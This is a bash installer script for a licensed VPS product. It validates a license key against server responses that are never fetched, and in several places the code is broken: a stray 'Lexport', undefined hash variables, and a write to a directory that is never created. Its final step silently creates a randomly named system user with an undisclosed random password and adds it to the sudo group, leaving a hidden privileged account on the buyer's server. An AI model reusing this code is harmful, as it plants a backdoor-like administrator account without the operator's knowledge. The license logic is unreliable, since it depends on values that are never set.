#!/bin/bash
# (C) Copyright 2022 By FahmiStore
# ==================================================================

# // Export Color & Information
export RED='\033[0;31m';
export GREEN='\033[0;32m';
export YELLOW='\033[0;33m';
export BLUE='\033[0;34m';
export PURPLE='\033[0;35m';
export CYAN='\033[0;36m';
export LIGHT='\033[0;37m';
export NC='\033[0m';

# // Export Banner Status Information
export ERROR="[${RED} ERROR ${NC}]";
export INFO="[${YELLOW} INFO ${NC}]";
export OKEY="[${GREEN} OKEY ${NC}]";
export PENDING="[${YELLOW} PENDING ${NC}]";
export SEND="[${YELLOW} SEND ${NC}]";
export RECEIVE="[${YELLOW} RECEIVE ${NC}]";
export RED_BG='\e[41m';


# // Export OS Information
export OS_ID=$( cat /etc/os-release | grep -w ID | sed 's/ID//g' | sed 's/=//g' | sed 's/ //g' );
export OS_VERSION=$( cat /etc/os-release | grep -w VERSION_ID | sed 's/VERSION_ID//g' | sed 's/=//g' | sed 's/ //g' | sed 's/"//g' );
export OS_NAME=$( cat /etc/os-release | grep -w PRETTY_NAME | sed 's/PRETTY_NAME//g' | sed 's/=//g' | sed 's/"//g' );
export OS_KERNEL=$( uname -r );
export OS_ARCH=$( uname -m );

mkdir -p /etc/licence/;

echo -e "${YELLOW}--------------------------------------------------${NC}"
echo "";
read -p "$(echo -e "${YELLOW} ~~~>${NC}") Input Your License Key : " lcn_key_inputed

# // Validate Lcn Input
if [[ $lcn_key_inputed == "" ]]; then
    clear
    echo -e "${ERROR} Please input your license key for contitune to installation";
    exit 1;
fi

# // Encrypting Your License to hash
export Lcn_String=$lcn_key_inputed;
export Algo1=bd882b78-7880-423b-96d9-847b6937cbbe;
export Algo2=ed884aa1-de49-4766-adc6-230d45e599fd;
export Algo3=71d1f32b-48c9-4539-961f-7faf9d7685f7;
export Algo4=b2c1c659-22a9-42a5-9db6-acd6e719e365;
export Algo5=d2466cdd-9481-41d7-8773-637824e700ca;
export Hash="$(echo -n "$Lcn_String" | sha256sum | cut -d ' ' -f 1)";
export Result_Hash="$(echo -n "${Hash}${Algo1}${Hash}${Algo2}${Hash}${Algo3}${Hash}${Algo4}${Hash}${Algo5}" | sha256sum | cut -d ' ' -f 1 )" ;
echo "";
echo -e "${YELLOW}--------------------------------------------------${NC}";

# // Check Blacklist
if [[ $( echo $CHK_BLACKLIST | jq -r '.respon_code' ) == "127" ]]; then
    echo -e "${OKEY} Your IP Not Blacklisted";
else
    echo -e "${ERROR} Your IP Got Blacklisted";
    exit 1;
fi

# // Checking Your License Key
if [[ $SEND_API_REQUEST == "" ]]; then
    echo -e "${ERROR} Database Connection Having Issue";
    exit 1;
fi

if [[ $Result_Hash == "$( echo $SEND_API_REQUEST | jq -r '.license' )" ]]; then
        if [[ "$( echo $SEND_API_REQUEST | jq -r '.status' )" == "active" ]]; then
            # // Output nama dll
            echo -e "${OKEY} Your License Name [ ${GREEN}$( echo $SEND_API_REQUEST | jq -r '.name' )${NC} ]";
            echo -e "${OKEY} Your License Type [ ${GREEN}$( echo $SEND_API_REQUEST | jq -r '.type' ) Version${NC} ]";

            # // Validasi Masa Aktif
            if [[ "$( echo $SEND_API_REQUEST | jq -r '.lifetime' )" == "true" ]]; then
                echo -e "${OKEY} Your License active [ ${GREEN}Lifetime${NC} ]";
            else
                waktu_sekarang=$(date -d "0 days" +"%Y-%m-%d");
                expired_date="$( echo $SEND_API_REQUEST | jq -r '.expired' )";
                now_in_s=$(date -d "$waktu_sekarang" +%s);
                exp_in_s=$(date -d "$expired_date" +%s);
                days_left=$(( ($exp_in_s - $now_in_s) / 86400 ));
                if [[ $days_left -lt 0 ]]; then
                    echo -e "${ERROR} Your License has expired at ${RED}$expired_date${NC}";
                    exit 1;
                else
                    echo -e "${OKEY} Your License active [ ${GREEN}$days_left days left${NC} ]";
                fi
            fi

            # // Validasi Limit Installasi
            if [[ "$( echo $SEND_API_REQUEST | jq -r '.unlimited' )" == "true" ]]; then
                    echo -e "${OKEY} Your Installation limit [ ${GREEN}Unlimited${NC} ]";
            else
                if [[ "$( echo $SEND_API_REQUEST | jq -r '.limit' )" -lt "$( echo $SEND_API_REQUEST | jq -r '.count' )" ]]; then
                    echo -e "${ERROR} Your license has reached limit ( ${RED}$( echo $SEND_API_REQUEST | jq -r '.count' ) ${NC}/${RED} $( echo $SEND_API_REQUEST | jq -r '.limit' )${NC} )";
                    exit 1;
                else
                    echo -e "${OKEY} Your License Limit ( ${GREEN}$( echo $SEND_API_REQUEST | jq -r '.count' ) ${NC}/${GREEN} $( echo $SEND_API_REQUEST | jq -r '.limit' )${NC} )";
                fi
            fi

            # // Aktivasi IP anda
            if [[ $( echo $DATABASE_SERVER_RESPON | jq -r '.respon_code' ) == "118" ]]; then
                echo -e "${OKEY} Successfull Registered Your IP";
                INSTALLASI_STATUS="install";
            elif [[ $( echo $DATABASE_SERVER_RESPON | jq -r '.respon_code' ) == "117" ]]; then
                echo -e "${OKEY} Your IP Already Registered";
                INSTALLASI_STATUS="reinstall";
            elif [[ $( echo $DATABASE_SERVER_RESPON | jq -r '.respon_code' ) == "115" ]]; then
                echo -e "${ERROR} Session Has expired";
                exit 1;
            elif [[ $( echo $DATABASE_SERVER_RESPON | jq -r '.respon_code' ) == "120" ]]; then
                echo -e "${ERROR} Your Has Registered ( ${GREEN}$( echo $SEND_API_REQUEST | jq -r '.count' )${NC} / ${GREEN}$( echo $SEND_API_REQUEST | jq -r '.limit' )${NC} )";
                exit 1;
            else
                echo -e "${ERROR} Having Error on database Connection";
                exit 1;
            fi

            # // Save Your License Key
            echo "${Result_Hash2} ${Result_Hash3} ${Result_Hash} ${Result_Hash4} ${Result_Hash5}" > /etc/wildydev21/license-key.wd21;
            export LCN_KEY=$( cat /etc/wildydev21/license-key.wd21 | awk '{print $3}' | sed 's/ //g' );

            # // Validate Your License key
            if [[ $LCN_KEY == "" ]]; then
                echo -e "${ERROR} Your VPS Having issue";
                exit 1;
            elif [[ $LCN_KEY == $Result_Hash ]]; then
                echo -e "${OKEY} Validated, Your will be redirect in 5 second";
                sleep 5;
            fi
        else
            echo -e "${ERROR} Your License Not Active.";
            exit 1;
        fi
else
    echo -e "${ERROR} Your License Key Not Valid.";
    exit 1
fi

# // Export API REQ FOR Installation information
if [[ $( echo ${API_REQ_NYA} | jq -r '.respon_code' ) == "104" ]]; then
    SKIP=true;
else
    clear;
    echo -e "${ERROR} Script Server Refused Connection";
    exit 1;
fi

# // Rending Your License data from json
export IP=$( echo ${API_REQ_NYA} | jq -r '.ip' );
Lexport STATUS_LCN=$( echo ${API_REQ_NYA} | jq -r '.status' );
export LICENSE_KEY=$( echo ${API_REQ_NYA} | jq -r '.license' );
export LIMIT=$( echo ${API_REQ_NYA} | jq -r '.limit' );
export CREATED=$( echo ${API_REQ_NYA} | jq -r '.created' );
export EXPIRED=$( echo ${API_REQ_NYA} | jq -r '.expired' );
export UNLIMITED=$( echo ${API_REQ_NYA} | jq -r '.unlimited' );
export LIFETIME=$( echo ${API_REQ_NYA} | jq -r '.lifetime' );

# // Make Script User
Username="script-$( </dev/urandom tr -dc 0-9 | head -c5 )";
Password="$( </dev/urandom tr -dc 0-9 | head -c12 )";
mkdir -p /home/script/;
useradd -r -d /home/script -s /bin/bash -M $Username;
echo -e "$Password\n$Password\n"|passwd $Username > /dev/null 2>&1;
usermod -aG sudo $Username > /dev/null 2>&1;
